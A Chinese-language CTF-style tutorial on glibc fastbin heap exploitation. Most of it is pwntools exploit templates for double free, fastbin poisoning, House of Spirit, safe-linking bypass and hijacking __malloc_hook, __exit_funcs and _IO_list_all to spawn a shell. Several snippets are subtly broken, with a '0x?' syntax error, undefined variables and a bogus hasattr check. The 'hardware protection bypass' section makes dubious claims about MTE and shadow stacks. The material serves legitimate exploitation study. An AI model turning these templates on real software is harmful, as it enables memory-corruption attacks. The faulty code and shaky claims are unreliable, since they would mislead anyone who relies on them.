# Fastbin 攻击

## 原理

glibc 的 fastbin 用于管理小块内存（0x20-0x80，64位），采用单链表 LIFO 结构，安全检查较弱。攻击者通过 UAF/Double Free 修改 fastbin 的 fd 指针，实现任意地址分配。

## Fastbin 特点

- 大小范围：0x20-0x80（64位），步长 0x10
- 单链表，LIFO
- 无合并
- size 检查（glibc 2.0+）
- 对齐检查（glibc 2.32+ safe-linking）

## 攻击链

### 1. Fastbin Double Free

```python
from pwn import *

p = process('./pwn')

# glibc < 2.26 或 tcache 满后
# 1. 分配 7 个 + 2 个
for i in range(7):
    malloc(0x70)  # idx 0-6
malloc(0x70)  # idx 7
malloc(0x70)  # idx 8
malloc(0x20)  # idx 9，防止合并
# 2. 释放 7 个填满 tcache
for i in range(7):
    free(i)
# 3. 释放 idx 7 和 idx 8，再释放 idx 7（double free）
free(7)
free(8)
free(7)  # double free
# fastbin: idx7 -> idx8 -> idx7 -> ...
# 4. 分配 7 个清空 tcache
for i in range(7):
    malloc(0x70)
# 5. 分配得到 idx7，修改 fd
malloc(0x70)  # idx 10，返回 idx7
edit(10, p64(target_addr))
# 6. 分配得到 idx8
malloc(0x70)  # idx 11，返回 idx8
# 7. 分配得到 target_addr
malloc(0x70)  # idx 12，返回 target_addr
```

### 2. Fastbin Poisoning

```python
# 1. 分配 7 个 + 1 个
for i in range(7):
    malloc(0x70)  # idx 0-6
malloc(0x70)  # idx 7
malloc(0x20)  # idx 8，防止合并
# 2. 释放 7 个填满 tcache
for i in range(7):
    free(i)
# 3. 释放 idx 7，进入 fastbin
free(7)
# 4. UAF 修改 fd
edit(7, p64(target_addr))
# 5. 分配 7 个清空 tcache
for i in range(7):
    malloc(0x70)
# 6. 分配得到 target_addr
malloc(0x70)  # 返回 fastbin 中的块
malloc(0x70)  # 返回 target_addr
```

### 3. 伪造 chunk size

```python
# fastbin 分配时会检查 size 是否匹配
# target_addr 处需要有合法的 size

# 例如：分配 0x70 的 chunk
# target_addr 处需要有 0x7X 的值（X 任意）
# 常见伪造点：
# 1. __malloc_hook - 0x23（0x7f）
# 2. GOT 表附近
# 3. 栈上伪造
```

### 4. House of Spirit

```python
# 在栈/BSS 上伪造 chunk
# 1. 在目标地址伪造 chunk 元数据
#    target_addr: prev_size(8) + size(8) + data
# 2. free 该地址
# 3. malloc 返回该地址

# 伪造
target = 0x404100
# 写入 size
write(target + 8, p64(0x31))  # size = 0x31
# free
free(target + 0x10)  # free chunk 起始地址
# malloc
malloc(0x20)  # 返回 target + 0x10
```

### 5. Safe-Linking 绕过 (glibc 2.32+)

```python
# glibc 2.32+ 引入 safe-linking
# fd 指针加密：ptr = (chunk_addr >> 12) ^ next_ptr
# 需要知道堆地址才能伪造

# 1. 泄露堆地址
# 2. 构造加密的 fd
target = 0x404000
chunk_addr = heap_addr + offset
encrypted = (chunk_addr >> 12) ^ target
edit(idx, p64(encrypted))
```

## 利用场景

### 1. 覆盖 __malloc_hook

```python
# glibc < 2.34
# 利用 __malloc_hook - 0x23 处的 0x7f 作为 size
target = libc.symbols['__malloc_hook'] - 0x23
# fastbin poisoning 分配到 target
# 然后覆盖 __malloc_hook
edit(idx, b'A' * 0x13 + p64(one_gadget))
```

### 2. 覆盖 __free_hook

```python
# glibc < 2.34
# 类似 __malloc_hook
target = libc.symbols['__free_hook'] - 0x?  # 找合适的 size
```

### 3. 覆盖 GOT 表

```python
# Partial RELRO
# 在 GOT 表附近找合适的 size
```

### 4. 分配到栈上

```python
# 1. 泄露栈地址
# 2. 在栈上伪造 chunk size
# 3. fastbin poisoning 分配到栈上
# 4. 覆盖返回地址
```

### 5. 分配到 BSS

```python
# 在 BSS 上伪造 chunk
# 分配到 BSS
# 覆盖全局变量
```

## 2024-2026 新技术点

### 1. glibc 2.34+ 无 hooks Fastbin 利用

```python
# glibc 2.34+ 移除 __malloc_hook/__free_hook
# Fastbin 攻击不再能直接覆盖 hook，需转向新目标

from pwn import *

context.arch = 'amd64'

def fastbin_exploit_no_hooks():
    """glibc 2.34+ fastbin 攻击模板"""
    p = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size, idx=None):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    # === 方案 1：Fastbin -> tcache poisoning -> exit_funcs ===
    # 将 fastbin chunk 分配到 tcache_perthread_struct 附近
    # 修改 tcache fd 进行 poisoning
    
    # 分配 chunk 用于后续 fastbin attack
    for i in range(7):
        malloc(0x70)   # 填满 tcache
    malloc(0x70)       # idx 7，进入 fastbin
    malloc(0x20)       # idx 8，guard chunk
    
    # 释放 7 个填满 tcache
    for i in range(7):
        free(i)
    # 释放 idx 7 进入 fastbin
    free(7)
    
    # 泄露 fastbin fd（已释放 chunk 的 fd 值）
    # 在 safe-linking 之前 (glibc < 2.32)：直接得到 next chunk 地址
    # 在 safe-linking 之后 (glibc 2.32+)：需要解密
    
    # 修改 fastbin fd 指向目标
    target = exit_funcs_addr  # 或其他目标
    edit(7, p64(target))
    
    # 清空 tcache，再分配两次
    for i in range(7):
        malloc(0x70)
    malloc(0x70)  # 返回原 chunk
    malloc(0x70)  # 返回 target
    # 此时可以写入 target
    
    # === 方案 2：Fastbin -> _IO_list_all ===
    # 将 fastbin chunk 分配到 _IO_list_all 附近
    # 构造 fake IO_FILE
    
    p.interactive()
```

### 2. safe-linking 绕过 (glibc 2.32+)

```python
# glibc 2.32+ fastbin fd 加密：encrypted = (chunk_addr >> 12) ^ next_ptr

from pwn import *

context.arch = 'amd64'

class FastbinSafeLinking:
    """fastbin safe-linking 绕过工具"""
    
    @staticmethod
    def encrypt_fd(chunk_addr, next_ptr):
        return (chunk_addr >> 12) ^ next_ptr
    
    @staticmethod
    def decrypt_fd(chunk_addr, encrypted):
        return (chunk_addr >> 12) ^ encrypted
    
    @staticmethod
    def leak_heap_from_last_fastbin(encrypted_fd):
        """从 fastbin 末尾 chunk 的加密 fd 泄露堆地址"""
        # 末尾 chunk 的 next 是 NULL
        return encrypted_fd << 12

def bypass_fastbin_safe_linking(p, malloc, free, edit):
    """绕过 fastbin safe-linking"""
    # Step 1：泄露堆地址
    # 分配足够多 chunk 确保 fastbin 不为空
    for i in range(7):
        malloc(0x70)
    malloc(0x70)  # idx 7
    malloc(0x20)  # guard
    
    for i in range(7):
        free(i)
    free(7)  # 进入 fastbin
    
    # 读取 fastbin 上的加密 fd
    # 由于 fastbin LIFO，idx 7 的 fd 指向 tcache 中最后一个 chunk
    # 需要选择合适的 chunk 来泄露
    
    # 更简单的方法：从 tcache 泄露堆地址
    # tcache 也有 safe-linking
    malloc(0x30)  # idx 0
    malloc(0x30)  # idx 1
    free(0)
    free(1)
    # 读取 idx 1 的加密 fd
    # encrypted = (idx1_addr >> 12) ^ idx0_addr
    # idx0 的 next = NULL (tcache 末尾)
    # encrypted_idx0 = (idx0_addr >> 12) ^ 0 = idx0_addr >> 12
    
    # 如果 idx0 是 tcache 最后一个：encrypted = (idx0_addr >> 12) ^ 0
    # heap = encrypted << 12
    
    # Step 2：构造加密 fd
    target = 0x404000
    chunk_addr = heap_base + 0x300
    encrypted = FastbinSafeLinking.encrypt_fd(chunk_addr, target)
    edit(idx, p64(encrypted))
    
    # Step 3：分配得到 target
    malloc(0x70)  # 清 tcache
    # ... 清完后分配 fastbin
```

### 3. House of Apple 系列 + Fastbin

```python
# 利用 fastbin attack 分配到 IO_FILE 相关结构

from pwn import *

context.arch = 'amd64'

def fastbin_to_io_file():
    """
    Fastbin attack -> _IO_list_all -> fake IO_FILE
    步骤：
    1. 通过 fastbin attack 分配到 _IO_list_all 附近
    2. 覆盖 _IO_list_all
    3. 伪造 fake IO_FILE (House of Apple 2/3)
    4. 触发 _IO_flush_all_lockp
    """
    elf = ELF('./pwn')
    io_list_all = elf.symbols.get('_IO_list_all', 0)
    # 分配到 _IO_list_all 附近
    alloc_to_target(io_list_all - 8)
    # 伪造 IO_FILE
    fake = FakeIOFile(elf, 'system', '/bin/sh')
    write_at(io_list_all, fake.to_bytes())
    trigger()

def fastbin_to_exit_funcs():
    """
    Fastbin attack -> __exit_funcs -> RCE
    glibc 2.34+ 完全移除 hooks 后，exit_funcs 是主流替代
    """
    from pwn import *
    elf = ELF('./pwn')
    # exit_funcs 在 libc 中偏移，需先 leak libc
    libc = ELF('./libc.so.6')
    exit_funcs = libc.symbols['__exit_funcs']
    system = libc.symbols['system']
    binsh = next(libc.search(b'/bin/sh'))

    # fastbin attack 分配到 exit_funcs
    for i in range(7): malloc(0x60)
    malloc(0x60)  # index 7: fastbin 末尾
    free(7)
    # 覆盖 fd 指向 exit_funcs（需 leak 堆地址解密 safe-linking）
    fake_fd = (exit_funcs - 8) ^ (heap[0] >> 12)
    edit(7, p64(fake_fd))
    malloc(0x60)  # 返回 chunk 7
    malloc(0x60)  # 返回 exit_funcs - 8
    # 覆盖 exit_function_list
    payload = p64(0) + p64(1) + p64(system) + b'/bin/sh\x00'
    write(0, payload)  # 简化
    exit()  # 触发 exit -> system("/bin/sh")
```

### 4. House of Cat (Fastbin 部分)

```python
# House of Cat 中 fastbin 的角色
# fastbin -> largebin -> _IO_list_all -> fake IO_FILE

from pwn import *

def house_of_cat_fastbin_component(io, elf, libc):
    """
    House of Cat 利用链中 fastbin 的作用：
    1. fastbin 用于泄露堆地址 (safe-linking decrypt)
    2. 分配到 largebin 范围后泄露 libc
    3. 配合 _IO_list_all 覆盖触发 _IO_wide_data -> system
    """
    chunks = []
    for i in range(8): chunks.append(malloc(0x60))
    # fastbin UAF → leak heap
    free(chunks[0])
    fd = leak(6)  # encrypted fd
    heap = fd << 12  # next=0, fastbin 末尾
    # 用这个能力进入 largebin attack
    log.info(f"heap base: {hex(heap)}")
```

### 5. 硬件级防护绕过

```python
from pwn import *

def hardware_bypass_fastbin():
    """硬件防护下 fastbin 利用的调整"""

    def mte_fastbin_bypass(io, elf):
        """MTE 绕过: tag spraying + 线程利用"""
        # 策略1: 大量 malloc 填满 tcache，让后续 chunk 进 fastbin
        # fastbin 中的 chunk tag 是分配时的随机 tag
        # 利用 fork 后的 child 进程：tag 空间重置
        # 策略2: 部分覆盖 fd 低字节，保留高位 tag 匹配
        for i in range(16): malloc(0x70)  # 填 tcache
        # 这些进 fastbin
        for i in range(4): malloc(0x80)
        # fork 场景下利用

    def shadow_stack_fastbin_bypass(io, elf):
        """影子栈绕过: 不覆盖返回地址"""
        # 策略: fastbin attack 不覆返回地址
        # 而是覆盖 __malloc_hook / __free_hook (glibc<2.34)
        # 或覆盖 exit_funcs (glibc>=2.34)
        # 影子栈只检测 ret 指令，hook 不经过影子栈
        malloc_hook = libc.symbols['__malloc_hook'] if hasattr(libc, '_malloc_hook') else None
        if malloc_hook:
            fastbin_attack_to(malloc_hook)
        else:
            fastbin_attack_to(libc.symbols['__exit_funcs'])
```

### 6. 沙箱环境 Fastbin 利用

```python
# seccomp 限制下的 fastbin 攻击

from pwn import *

context.arch = 'amd64'

def fastbin_orw():
    """fastbin 攻击实现 ORW"""
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    # 1. Fastbin poisoning 获取任意写
    # 2. 覆盖 _IO_write_base / _IO_write_ptr
    #    控制 stdout 输出任意内存
    # 3. 泄露 flag 内容
    # 或
    # 2. 覆盖 exit_funcs
    # 3. 构造 ORW ROP 链
    # 4. 触发 exit 执行
    
    # stdout 劫持技巧（glibc 2.34+）：
    # 覆盖 _IO_2_1_stdout_ 的 _IO_write_base
    # 设置为低地址，让 _IO_write_ptr 为高地址
    # printf 时会输出 _IO_write_base 到 _IO_write_ptr 之间的内容
    # 从而泄露 libc / 堆 / 栈地址
    
    stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']
    # fake _IO_write_base = stdout_addr + 0x20 (低地址)
    # fake _IO_write_ptr = libc_base + 0x (高地址，待泄露的区域)
    # 程序下次调用 printf 时会输出该区域
    
    p.interactive()
```

## 工具推荐

- **pwntools** — Python 利用框架
- **gdb + pwndbg** — 动态调试（fastbins 命令）
- **heap-viewer** — 堆可视化

## 参考链接

- [ctf-wiki fastbin](https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/)
- [how2heap fastbin](https://github.com/shellphish/how2heap)
- [Fastbin Attack](https://www.jianshu.com/p/4d7d7a460c0c)
